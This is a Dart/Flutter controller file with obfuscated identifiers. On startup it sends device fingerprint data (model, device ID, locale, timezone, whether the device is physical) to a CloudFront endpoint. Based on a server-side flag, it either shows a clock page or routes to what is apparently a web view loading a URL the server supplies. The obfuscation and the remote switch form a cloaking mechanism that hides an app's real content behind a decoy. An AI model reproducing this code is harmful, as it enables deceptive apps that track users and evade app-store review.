import 'dart:io';
import 'package:get/get.dart';
import 'package:dio/dio.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class TodayTaskEntranceLogic extends GetxController {

  var xkaled = RxBool(false);
  var zoinkvlts = RxBool(true);
  var emhc = RxString("");
  var gyrb = RxBool(false);
  var jhkpc = RxBool(true);
  final mhpjxwtvu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cyrb();
  }


  Future<void> cyrb() async {
    gyrb.value = true;
    jhkpc.value = true;
    zoinkvlts.value = false;

    mhpjxwtvu.post("https://dlv61ygqgm4uv.cloudfront.net/qewfbsjodihxnzpcltakgyvumr?no_check",data: await zmoyidhjsx()).then((value) {
      var ketomgl = value.data["ketomgl"] as String;
      var vpmkt = value.data["vpmkt"] as bool;
      if (vpmkt) {
        emhc.value = ketomgl;
        dunxymsk();
      } else {
        xwdtkb();
      }
    }).catchError((e) {
      zoinkvlts.value = true;
      jhkpc.value = true;
      gyrb.value = false;
    });
  }

  Future<Map<String, dynamic>> zmoyidhjsx() async {
    final DeviceInfoPlugin edkv = DeviceInfoPlugin();
    PackageInfo dsjnailo_tianr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ufedx = Platform.localeName;
    var uomsbqh = currentTimeZone;

    var holwq = dsjnailo_tianr.packageName;
    var wuxbt = dsjnailo_tianr.version;
    var jmghpksx = dsjnailo_tianr.buildNumber;

    var lzdumvsq = dsjnailo_tianr.appName;
    var trngeu = "";
    var byrvx  = "";
    var lgcnw = "";
    var phxvbnf = "";
    var boayjr = "";
    var wuijxre = "";
    var roquj = "";
    var ktol = "";
    var uyqi = "";
    var riayton = "";


    var vhsjckzq = "";
    var qhmxt = false;

    if (GetPlatform.isAndroid) {
      vhsjckzq = "android";
      var fuypwbnh = await edkv.androidInfo;

      lgcnw = fuypwbnh.brand;

      trngeu  = fuypwbnh.model;
      byrvx = fuypwbnh.id;

      qhmxt = fuypwbnh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vhsjckzq = "ios";
      var cdhnrm = await edkv.iosInfo;
      lgcnw = cdhnrm.name;
      trngeu = cdhnrm.model;

      byrvx = cdhnrm.identifierForVendor ?? "";
      qhmxt  = cdhnrm.isPhysicalDevice;
    }

    var res = {
      "lzdumvsq": lzdumvsq,
      "jmghpksx": jmghpksx,
      "wuxbt": wuxbt,
      "holwq": holwq,
      "trngeu": trngeu,
      "uomsbqh": uomsbqh,
      "lgcnw": lgcnw,
      "byrvx": byrvx,
      "ufedx": ufedx,
      "vhsjckzq": vhsjckzq,
      "qhmxt": qhmxt,
      "phxvbnf" : phxvbnf,
      "boayjr" : boayjr,
      "wuijxre" : wuijxre,
      "roquj" : roquj,
      "ktol" : ktol,
      "uyqi" : uyqi,
      "riayton" : riayton,

    };
    return res;
  }

  Future<void> xwdtkb() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> dunxymsk() async {
    Get.offNamed("/Outreload");
  }

}
